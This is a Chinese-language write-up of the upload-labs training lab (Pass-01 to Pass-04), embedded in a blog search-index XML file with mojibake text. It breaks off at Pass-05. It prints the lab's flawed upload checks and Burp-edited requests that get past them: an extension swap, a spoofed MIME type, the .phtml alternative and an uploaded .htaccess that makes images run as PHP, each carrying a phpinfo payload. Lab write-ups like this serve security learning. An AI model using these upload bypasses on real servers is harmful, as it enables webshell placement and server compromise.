<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>upload-labs</title>
      <link href="/2022/02/28/upload-labs/"/>
      <url>/2022/02/28/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-files-å­¦ä¹ "><a href="#upload-files-å­¦ä¹ " class="headerlink" title="upload files å­¦ä¹ "></a>upload files å­¦ä¹ </h1><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>æµ‹è¯•ç¯å¢ƒ</p><blockquote><p>æ“ä½œç³»ç»Ÿï¼šwindows<br>phpç‰ˆæœ¬ï¼š5.2.17</p></blockquote><h2 id="Pass-o1"><a href="#Pass-o1" class="headerlink" title="Pass-o1"></a>Pass-o1</h2><p><strong>å‰ç«¯-jsæ£€æŸ¥</strong>   </p><p>ä¸Šé©¬ï¼Œå¦‚ä¸‹æç¤º</p><p> <img src="/2022/02/28/upload-labs/2022-02-28-10-43-51.png"></p><p> çŒœæµ‹ä¸ºå‰ç«¯æ£€æµ‹ï¼ŒæŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œç™½åå• <code>.jpg|.png|.gif</code></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰ç«¯æ£€æµ‹çš„è¯ï¼Œå…³é—­jsè§£æ&#x2F;burpæ”¹åŒ…<br>1ã€å…³é—­jsè§£æ</p><p><img src="/2022/02/28/upload-labs/2022-02-28-10-52-54.png"><br>2ã€burpæ”¹åŒ… åœ¨filenameè¯¥æˆéœ€è¦çš„åç¼€å³å¯ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/Pass-01/index.php</span><br><span class="line">Cookie: <span class="keyword">pass</span>=01</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>éƒ½å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œç„¶åæ‰¾åˆ°è¹„ç‰‡å³é”®å¤åˆ¶åœ°å€<br><img src="/2022/02/28/upload-labs/2022-02-28-10-59-35.png"><br>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/upload/a.php å³æœ¨é©¬åœ°å€</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼Œä¼ ğŸæˆåŠŸ</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-02-07.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>æœåŠ¡ç«¯-MIMEæ–‡ä»¶ç±»å‹æ£€æŸ¥</strong></p><p>ç›´æ¥ä¸Šé©¬è¢«æ£€æµ‹é”™è¯¯ã€‚<br>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;02&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burpæ”¹åŒ…ï¼Œä¿®æ”¹<code>Content-Type</code>ï¼Œéƒ¨åˆ†ä¸º <code>image/jpeg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-02/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">191691572411478</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">191691572411478</span>--</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-11-13-41.png"></p><p><strong>èƒŒæ™¯çŸ¥è¯†ï¼š</strong></p><p><a href="https://www.php.net/manual/zh/features.file-upload.post-method.php">POST æ–¹æ³•ä¸Šä¼ </a></p><p>å…¨å±€å˜é‡ $_FILES åŒ…å«æœ‰æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ã€‚ æ•°ç»„çš„å†…å®¹æ¥è‡ªä»¥ä¸‹èŒƒä¾‹è¡¨å•ã€‚æˆ‘ä»¬å‡è®¾æ–‡ä»¶ä¸Šä¼ å­—æ®µçš„åç§°å¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼Œä¸º userfileã€‚åç§°å¯éšæ„å‘½åã€‚</p><blockquote><p><code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>  å®¢æˆ·ç«¯æœºå™¨æ–‡ä»¶çš„åŸåç§°ã€‚  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>  æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œå¦‚æœæµè§ˆå™¨æä¾›æ­¤ä¿¡æ¯çš„è¯ã€‚ä¸€ä¸ªä¾‹å­æ˜¯â€œimage&#x2F;gifâ€ã€‚ä¸è¿‡æ­¤ MIME ç±»å‹åœ¨ PHP ç«¯å¹¶ä¸æ£€æŸ¥ï¼Œå› æ­¤ä¸è¦æƒ³å½“ç„¶è®¤ä¸ºæœ‰è¿™ä¸ªå€¼ã€‚  </p><p><code>$_FILES[&#39;userfile&#39;][&#39;size&#39;]</code>  å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚</p><p><code>$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]</code> æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚</p><p><code>$_FILES[&#39;userfile&#39;][&#39;error&#39;]</code><br>å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚</p></blockquote><p>æ–‡ä»¶è¢«ä¸Šä¼ åï¼Œé»˜è®¤åœ°ä¼šè¢«å‚¨å­˜åˆ°æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•ä¸­ï¼Œé™¤é php.ini ä¸­çš„ upload_tmp_dir è®¾ç½®ä¸ºå…¶å®ƒçš„è·¯å¾„ã€‚æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•å¯ä»¥é€šè¿‡æ›´æ”¹ PHP è¿è¡Œç¯å¢ƒçš„ç¯å¢ƒå˜é‡ TMPDIR æ¥é‡æ–°è®¾ç½®ï¼Œä½†æ˜¯åœ¨ PHP è„šæœ¬å†…éƒ¨é€šè¿‡è¿è¡Œ putenv() å‡½æ•°æ¥è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚è¯¥ç¯å¢ƒå˜é‡ä¹Ÿå¯ä»¥ç”¨æ¥ç¡®è®¤å…¶å®ƒçš„æ“ä½œä¹Ÿæ˜¯åœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸Šè¿›è¡Œçš„ã€‚</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>æœåŠ¡ç«¯-å¼±é»‘åå•æ£€æŸ¥</strong><br>ç›´æ¥ä¸Šé©¬ï¼Œæç¤ºé”™è¯¯<br>æŸ¥çœ‹åç«¯ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;03&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç™½åå•æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨<code>php3/php5/phtml</code></p><p>ä»¥phtmlä¸ºä¾‹ï¼ŒburpæŠ“åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.phtml&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------<span class="number">293582696224464</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">293582696224464</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-44-16.png"></p><p>èƒŒæ™¯çŸ¥è¯†ï¼š<br>ä½¿ç”¨<code>php3/php5/phtml</code>æˆåŠŸçš„å‰ææ˜¯æœåŠ¡ç«¯è§£æè¿™äº›åç¼€ï¼Œæœ¬åœ°æœåŠ¡ç«¯ä¿®æ”¹æ–¹æ³•æ˜¯<br>æ‰¾åˆ°apacheä¸‹çš„conf&#x2F;httpd.confï¼Œç„¶åä¿®æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸæ•°æ®</span><br><span class="line"><span class="comment">#AddType application/x-httpd-php .php .phtml</span></span><br><span class="line">å»æ‰æ³¨é‡Šï¼Œä¿®æ”¹ä¸º</span><br><span class="line">AddType application/x-httpd-php .php .phtml .php3 .php5</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ AddType å¯ä»¥å°†ç»™å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°æŒ‡å®šçš„å†…å®¹ç±»å‹<br>ç”¨æ³•ï¼š  </p><blockquote><p>AddType media-type extension [extension] â€¦</p></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_44023693/article/details/104754029">phpstudyæ— æ³•è§£æphp2ã€php3ã€phtmlç­‰æ–‡ä»¶</a><br><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apacheçš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>æœåŠ¡ç«¯-å¼ºé»‘åå•æ£€æŸ¥-ä¿®æ”¹.htaccess</strong><br>ä¼ é©¬å¤±è´¥<br>çœ‹ä»£ç ï¼Œé»‘åˆ°æ— äººæ€§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¸Šä¼ <code>.htaccess</code>ï¼Œè¦†ç›–åŸä»¶ï¼Œè§£æjpgæ–‡æœ¬é‡Œçš„phpä»£ç ï¼Œå†…å®¹ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨burpæŠ“åŒ…æŸ¥çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="keyword">pass</span>=04</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">-----------------------------<span class="number">168279961491</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">168279961491</span>--</span><br></pre></td></tr></table></figure><p>è®¿é—®<br><img src="/2022/02/28/upload-labs/2022-02-28-12-15-57.png"></p><p><strong>èƒŒæ™¯çŸ¥è¯†ï¼š</strong></p><p>.htaccess<br> å¯ä»¥å®ç°ç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚è¯¦è§ <a href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a> ã€‚</p><p>SetHandler å¯ä»¥å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç†<br>ç”¨æ³•ï¼š<br>SetHandler handler-name|None<br>ç¤ºä¾‹1ï¼š<br>SetHandler application&#x2F;x-httpd-php<br>æ­¤æ—¶å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«å½“åš php è§£æ</p><p><strong>å‚è€ƒï¼š</strong>  </p><p><a href="https://www.tspweb.com/key/apache%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AE%9A%E4%B9%89.html">apacheçš„é…ç½®æ–‡ä»¶ä¸­å®šä¹‰</a></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" 